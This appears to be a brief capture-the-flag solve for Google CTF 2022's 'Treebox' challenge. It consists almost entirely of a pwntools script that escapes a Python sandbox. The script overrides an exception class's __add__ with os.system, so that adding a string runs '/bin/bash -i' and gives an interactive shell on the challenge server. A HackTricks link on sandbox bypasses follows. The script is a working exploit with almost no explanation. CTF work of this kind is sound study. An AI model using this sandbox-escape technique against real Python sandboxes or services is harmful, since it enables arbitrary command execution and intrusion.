## TREEBOX
### Solve
```python
import pwn

payload = '''# Declare arbitrary exception class
class Klecko(Exception):
  def __add__(self,algo):
    return 1

# Change add function
Klecko.__add__ = os.system

# Generate an object of the class with a try/except + raise
try:
  raise Klecko
except Klecko as k:
  k + "/bin/bash -i" #RCE abusing __add__
--END'''
p = pwn.remote('treebox.2022.ctfcompetition.com', 1337)
p.recv(1024)
p.sendline(payload)
p.interactive()
```
### Reference
- https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python-execution-without-calls